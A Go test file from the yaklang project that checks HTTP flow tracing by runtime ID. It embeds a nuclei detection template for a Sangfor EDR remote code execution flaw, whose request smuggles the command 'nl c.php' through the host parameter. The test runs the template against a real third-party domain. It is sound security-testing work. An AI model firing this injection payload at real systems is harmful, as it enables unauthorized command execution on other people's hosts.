package yakgrpc

import (
	"context"
	"github.com/davecgh/go-spew/spew"
	"github.com/yaklang/yaklang/common/consts"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"strings"
	"testing"
)

func init() {
	consts.GetGormProfileDatabase()
	consts.GetGormProjectDatabase()
	_ = yakit.CallPostInitDatabase()
}

func TestGRPCMUSTPASS_EXEC_YAK_SCRIPT_TRACEFLOW(t *testing.T) {
	/*
		trace traffic http flow:
			via runtime id
	*/
	utils.EnableDebug()

	client, err := NewLocalClient()
	if err != nil {
		panic(err)
	}
	name, err := yakit.CreateTemporaryYakScript("nuclei", `id: CNVD-2020-46552

info:
  name: Sangfor EDR - Remote Code Execution
  author: ritikchaddha
  severity: critical
  description: Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could execute arbitrary commands on the target host.
  reference:
    - https://www.modb.pro/db/144475
    - https://blog.csdn.net/bigblue00/article/details/108434009
    - https://cn-sec.com/archives/721509.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: cnvd,cnvd2020,sangfor,rce

requests:
  - method: GET
    path:
      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php"

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "$show_input = function($info)")'
          - 'contains(body, "$strip_slashes($host)")'
          - 'contains(body, "Log Helper")'
          - 'status_code == 200'
        condition: and

# Enhanced by mp on 2022/05/18
`)
	spew.Dump(name)
	stream, err := client.ExecYakScript(context.Background(), &ypb.ExecRequest{
		ScriptId: name,
		Params: []*ypb.ExecParamItem{
			{Key: "target", Value: "https://baidu.com"},
		},
	})
	if err != nil {
		panic(err)
	}

	var runtimes []string
	for {
		data, err := stream.Recv()
		if err != nil {
			spew.Dump(err)
			break
		}
		if data.RuntimeID == "" {
			t.Log("NO RUNTIME ID FOUND")
			t.FailNow()
		}
		if !strings.Contains(strings.Join(runtimes, ","), data.RuntimeID) {
			runtimes = append(runtimes, data.RuntimeID)
		}
		spew.Dump(data)
	}

	if len(runtimes) != 1 {
		t.Logf("MULTI RUNTIME FOUND: %v", runtimes)
		t.FailNow()
	}

	var runtimeId = runtimes[0]
	p, _, err := yakit.QueryHTTPFlow(consts.GetGormProjectDatabase(), &ypb.QueryHTTPFlowRequest{
		RuntimeId: runtimeId,
	})
	if err != nil {
		t.Log("Trace Flow Failed")
		t.FailNow()
	}
	if p.TotalRecord > 0 {
		t.Log("Trace Flow Success")
	} else {
		t.Log("Trace Flow Failed")
		t.FailNow()
	}
}
